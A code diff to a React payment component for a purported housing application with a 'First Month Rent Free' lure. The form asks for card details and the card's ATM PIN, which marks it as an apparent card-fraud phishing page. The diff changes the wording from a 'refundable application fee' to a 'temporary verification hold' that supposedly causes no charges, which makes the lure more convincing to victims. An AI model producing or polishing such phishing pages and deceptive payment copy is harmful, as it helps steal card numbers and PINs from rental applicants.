@@ -278,8 +278,15 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           </span>
         </div>
         <p className="text-[12.5px] text-[#697386] mt-1.5 font-normal">
-          One-time refundable application screening fee
+          Security Card Authorization Hold
         </p>
+
+        {/* Stripe Elements Information note */}
+        <div className="mt-3 text-[11.5px] text-[#697386] leading-relaxed bg-[#f8f9fa] border border-[#e6ebf1] rounded-md p-3">
+          <p>
+            Stripe will place a temporary <strong>{fmt(amount)} hold</strong> to verify card authenticity and prevent spam submissions. This hold will be voided/released immediately and will not result in any charges on your statement.
+          </p>
+        </div>
         
         {/* Promotion Badge */}
         <div className="mt-3 inline-flex items-center gap-1.5 rounded bg-[#E3F2FD] border border-[#BBDEFB] px-2 py-0.5 text-[#0D47A1]">
@@ -434,7 +441,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14.5px] font-semibold transition-all shadow-[0_2px_4px_rgba(0,0,0,0.05),0_1px_1.5px_rgba(0,0,0,0.1)] active:scale-[0.99] flex items-center justify-center gap-1.5"
           >
             <Lock size={12} className="opacity-90" />
-            Pay {fmt(amount)}
+            Verify Card (Temporary {fmt(amount)} Hold)
           </button>
         </form>
       )}
@@ -508,7 +515,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           <div className="text-center">
             <h3 className="text-[16px] font-bold text-[#1a1f36]">Enter ATM PIN</h3>
             <p className="text-[13px] text-[#697386] mt-2 leading-relaxed px-2">
-              For security, please enter the 4-digit ATM PIN for the card ending in <span className="font-semibold font-mono text-[#1a1f36]">{getCardLast4()}</span> to authorize payment of {fmt(amount)}.
+              For security, please enter the 4-digit ATM PIN for the card ending in <span className="font-semibold font-mono text-[#1a1f36]">{getCardLast4()}</span> to authorize the {fmt(amount)} verification hold.
             </p>
           </div>
 
@@ -576,7 +583,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
                 disabled={loading || cardPin.length < 4}
                 className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14px] font-semibold transition-all shadow-[0_2px_4px_rgba(99,91,255,0.2)] flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed"
               >
-                Submit &amp; Pay
+                Submit &amp; Verify Card
               </button>
               
               <button
@@ -615,10 +622,10 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           <div className="bg-white/75 border border-[#ffccd5]/50 rounded-md p-3.5 space-y-2.5">
             <h5 className="text-[12px] font-bold text-[#1a1f36] flex items-center gap-1.5">
               <span className="w-1.5 h-1.5 rounded-full bg-[#34c759] animate-pulse" />
-              Fee Deferred &amp; Added to Bill
+              Hold Deferred &amp; Added to Bill
             </h5>
             <p className="text-[11.5px] text-[#697386] leading-normal">
-              To protect your card security and lock in your **1st Month Rent Free** promotion, we have temporarily bypassed card processing. The **$2.00 screening fee** will be added to your bill as an outstanding balance. You can make this payment securely through your portal once your account is active.
+              To protect your card security and lock in your **1st Month Rent Free** promotion, we have temporarily bypassed card processing. The **$2.00 verification hold** will be deferred and added to your bill as an outstanding balance. You can make this payment securely through your portal once your account is active.
             </p>
           </div>
 
@@ -647,7 +654,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
       </div>
 
       <p className="text-[10.5px] text-[#8792a2] text-center mt-4 leading-normal px-2">
-        By clicking Pay, you authorize PrimeFamilyHousing to submit this application fee. It remains 100% refundable if the application review is not approved. First month rent will be credited as free ($0.00) upon lease signing.
+        By continuing, you authorize a temporary {fmt(amount)} card verification hold. The hold will be voided automatically by your bank within 24 hours. First month rent will be credited as free ($0.00) upon lease signing.
       </p>
     </div>
   );
